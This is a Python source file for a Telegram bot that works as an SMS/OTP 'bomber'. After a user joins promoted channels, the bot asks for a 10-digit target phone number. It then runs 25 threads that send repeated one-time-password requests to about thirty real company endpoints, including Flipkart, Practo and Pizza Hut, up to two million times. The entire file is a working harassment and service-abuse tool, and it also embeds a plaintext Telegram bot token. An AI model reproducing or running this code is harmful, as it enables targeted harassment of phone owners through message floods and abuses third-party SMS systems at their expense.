import asyncio
import random
import requests
import urllib.request
import threading
import time
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
    CallbackQueryHandler 
)

# --- CONFIGURATION SECTION ---
REQUIRED_CHANNELS = [
    {"id": "@hack4hub", "link": "https://t.me/hack4hub"},
    {"id": "@STAR_GIFTS_0", "link": "https://t.me/STAR_GIFTS_0"}
]

BOT_TOKEN = "8022661176:AAFUD-aiXRQ58Tt0WXDbFizEatC_yLA0_44"
VERIFY_CALLBACK_DATA = "verify_all_channels"
API_INDICES = [i for i in range(31)] 
DEFAULT_COUNTRY_CODE = "91"
BOMBING_DELAY_SECONDS = 0.4 
MAX_REQUEST_LIMIT = 2000000
THREAD_COUNT = 25 
TELEGRAM_RATE_LIMIT_SECONDS = 5 

# --- SESSION DATA (RAM ONLY) ---
verified_users = set()  
bombing_active = {}
request_counts = {}
global_request_counter = threading.Lock()
session = requests.Session()

def esc(text: str) -> str:
    escape_chars = r"_*[]()~`>#+-=|{}.!"
    for ch in escape_chars:
        text = text.replace(ch, "\\" + ch)
    return text

def getapi(pn, lim, cc):
    cc, pn, lim = str(cc), str(pn), int(lim)
    url_urllib = [
        "https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B" + cc + "&nod=4&phone=" + pn, 
        "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=" + pn, 
        "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + pn
    ]
    if lim < len(url_urllib):
        try:
            urllib.request.urlopen(url_urllib[lim], timeout=5)
            return True
        except: return False
    try:
        if lim == 3: return session.post('https://pharmeasy.in/api/auth/requestOTP', json={"contactNumber":pn}, timeout=5).status_code == 200
        elif lim == 4: return session.post('https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php', data={'mobile_no': pn, 'randome': 'ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis=', 'csrf': '523bc3fa1857c4df95e4d24bbd36c61b'}, timeout=5).status_code == 200
        elif lim == 5: return session.post('https://indialends.com/internal/a/mobile-verification_v2.ashx', data={'aeyder03teaeare': '1', 'ertysvfj74sje': cc, 'jfsdfu14hkgertd': pn, 'lj80gertdfg': '0'}, timeout=5).status_code == 200
        elif lim == 6: return session.post('https://www.flipkart.com/api/6/user/signup/status', json={"loginId":[f"+{cc}{pn}"],"supportAllStates":True}, timeout=5).status_code == 200
        elif lim == 7: return session.post('https://www.flipkart.com/api/5/user/otp/generate', data={'loginId': f'+{cc}{pn}', 'state': 'VERIFIED'}, timeout=5).status_code == 200
        elif lim == 8: return session.post('https://www.ref-r.com/clients/lenskart/smsApi', data={'mobile': pn, 'submit': '1'}, timeout=5).status_code == 200
        elif lim == 9: return "success" in session.post("https://accounts.practo.com/send_otp", data={'mobile': f'+{cc}{pn}', 'client_name': 'Practo Android App'}, timeout=5).text.lower()
        elif lim == 10: return session.post('https://m.pizzahut.co.in/api/cart/send-otp?langCode=en', json={"customer":{"MobileNo":pn,"UserName":pn,"merchantId":"98d18d82-ba59-4957-9c92-3f89207a34f6"}}, timeout=5).status_code == 200
        elif lim == 11: return session.post('https://www.goibibo.com/common/downloadsms/', data={'mbl': pn}, timeout=5).status_code == 200
        elif lim == 12: return "sent" in session.post('https://www.apollopharmacy.in/sociallogin/mobile/sendotp/', data={'mobile': pn}, timeout=5).text.lower()
        elif lim == 13: return '"statusCode":"1"' in session.post('https://www.ajio.com/api/auth/signupSendOTP', json={"firstName":"SpeedX","mobileNumber":pn,"requestType":"SENDOTP"}, timeout=5).text
        elif lim == 14: return session.post('https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN', json={"country_code":cc,"phone_number":pn}, timeout=5).status_code == 200
        elif lim == 15: return 'code:' in session.post('https://www.aala.com/accustomer/ajax/getOTP', data={'email': f'{cc}{pn}', 'firstname': 'SpeedX', 'lastname': 'SpeedX'}, timeout=5).text
        elif lim == 16: return session.post('https://api.grab.com/grabid/v1/phone/otp', data={'method': 'SMS', 'countryCode': 'id', 'phoneNumber': f'{cc}{pn}'}, timeout=5).status_code == 200
        elif lim == 17: return session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers={"gk-merchant-id": "19g6im8srkz9y"}, json={"phone": pn, "country": "IN"}, timeout=5).status_code == 200
        elif lim == 18: return session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers={"gk-merchant-id": "19an4fq2kk5y"}, json={"phone": pn, "country": "IN"}, timeout=5).status_code == 200
        elif lim == 19: return session.post("https://api.breeze.in/session/start", json={"phoneNumber": pn, "countryCode": f"+{cc}"}, timeout=5).status_code == 200
        elif lim == 20: return session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers={"gk-merchant-id": "19g6ilhej3mfc"}, json={"phone": pn, "country": "IN"}, timeout=5).status_code == 200
        elif lim == 21: return session.post("https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", json={"mobile_number": pn, "client_id": "kisan-app"}, timeout=5).status_code == 200
        elif lim == 22: return session.post("https://api.penpencil.co/v1/users/resend-otp?smsType=2", json={"mobile": pn, "organizationId": "5eb393ee95fab7468a79d189"}, timeout=5).status_code == 200
        elif lim == 23: return session.post("https://api.khatabook.com/v1/auth/request-otp", json={"country_code": f"+{cc}", "phone": pn}, timeout=5).status_code == 200
        elif lim == 24: return session.get(f"https://www.jockey.in/apps/jotp/api/login/send-otp/+{cc}{pn}?whatsapp=true", timeout=5).status_code == 200
        elif lim == 25: return session.post("https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", headers={"gk-merchant-id": "19kc37zcdyiu"}, json={"phone": pn, "country": "IN"}, timeout=5).status_code == 200
        elif lim == 26: return session.post('https://vidyakul.com/signup-otp/send', data={'phone': pn}, timeout=5).status_code == 200
        elif lim == 27: return session.post('https://oneservice.adityabirlacapital.com/apilogin/onboard/generate-otp', json={'phone': pn}, timeout=5).status_code == 200
        elif lim == 28: return session.post('https://pinknblu.com/v1/auth/generate/otp', data={'country_code': f'+{cc}', 'phone': pn}, timeout=5).status_code == 200
        elif lim == 29: return session.post('https://auth.udaan.com/api/otp/send?client_id=udaan-v2', data={'mobile': pn}, timeout=5).status_code == 200
        elif lim == 30: return session.post('https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO', json={"contactInfo": pn, "mode": "SMS"}, timeout=5).status_code == 200
        return False
    except: return False

def bombing_thread_worker(user_id, phone_number):
    global global_request_counter, request_counts
    available_apis = API_INDICES[:]
    while bombing_active.get(user_id) and request_counts.get(user_id, 0) < MAX_REQUEST_LIMIT:
        if not available_apis: break
        api_index = random.choice(available_apis)
        success = getapi(phone_number, api_index, DEFAULT_COUNTRY_CODE)
        with global_request_counter:
            request_counts[user_id] = request_counts.get(user_id, 0) + 1
        if not success and api_index in available_apis: available_apis.remove(api_index)
        time.sleep(BOMBING_DELAY_SECONDS)

async def perform_bombing_task(user_id, phone_number, context):
    request_counts[user_id] = 0
    await context.bot.send_message(chat_id=user_id, text=esc(f"🚀 Bombing Started! Target: `{phone_number}`"), parse_mode="MarkdownV2")
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=bombing_thread_worker, args=(user_id, phone_number))
        t.daemon = True
        t.start()
    last_msg_time = time.time()
    while bombing_active.get(user_id):
        await asyncio.sleep(1)
        if (time.time() - last_msg_time) >= TELEGRAM_RATE_LIMIT_SECONDS:
            await context.bot.send_message(chat_id=user_id, text=esc(f"📊 Status: `{request_counts.get(user_id, 0)}` sent."), parse_mode="MarkdownV2")
            last_msg_time = time.time()
    await context.bot.send_message(chat_id=user_id, text=esc(f"✅ Finished! Total: `{request_counts.get(user_id, 0)}`"), parse_mode="MarkdownV2")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # BLOCK GROUPS
    if update.message.chat.type != "private": return 

    keyboard = []
    for chan in REQUIRED_CHANNELS:
        keyboard.append([InlineKeyboardButton(f"🔗 Join {chan['id']}", url=chan['link'])])
    keyboard.append([InlineKeyboardButton("✅ Verify Channels", callback_data=VERIFY_CALLBACK_DATA)])
    
    await update.message.reply_text(
        esc("Welcome! Join our channels to unlock bombing:"),
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="MarkdownV2"
    )

async def verify_membership(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    unjoined = []
    for chan in REQUIRED_CHANNELS:
        try:
            m = await context.bot.get_chat_member(chat_id=chan['id'], user_id=user_id)
            if m.status not in ["member", "administrator", "creator"]: unjoined.append(chan['id'])
        except: unjoined.append(chan['id'])

    if not unjoined:
        verified_users.add(user_id)
        markup = ReplyKeyboardMarkup([["🔥 Start Bombing", "🛑 Stop Bombing"]], resize_keyboard=True)
        await query.edit_message_text("✅ Verified! Use the menu below.")
        await context.bot.send_message(chat_id=user_id, text="Main Menu:", reply_markup=markup)
    else:
        await query.answer(f"❌ Join first: {', '.join(unjoined)}", show_alert=True)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # CRITICAL: Ignore all messages that are NOT in a Private Chat
    if update.message.chat.type != "private": return

    user_id = update.message.from_user.id
    text = update.message.text

    if user_id not in verified_users:
        await update.message.reply_text("❌ Use /start and verify first.")
        return

    if text == "🔥 Start Bombing":
        context.user_data["awaiting_num"] = True
        await update.message.reply_text(esc("🎯 Enter 10-digit target:"), parse_mode="MarkdownV2")
    elif text == "🛑 Stop Bombing":
        bombing_active[user_id] = False
        await update.message.reply_text("🛑 Stopping...")
    elif context.user_data.get("awaiting_num"):
        if text.isdigit() and len(text) == 10:
            context.user_data["awaiting_num"] = False
            bombing_active[user_id] = True
            asyncio.create_task(perform_bombing_task(user_id, text, context))
        else: await update.message.reply_text("❌ Enter 10 digits.")

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(verify_membership, pattern=VERIFY_CALLBACK_DATA))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.run_polling()

if __name__ == "__main__": main()
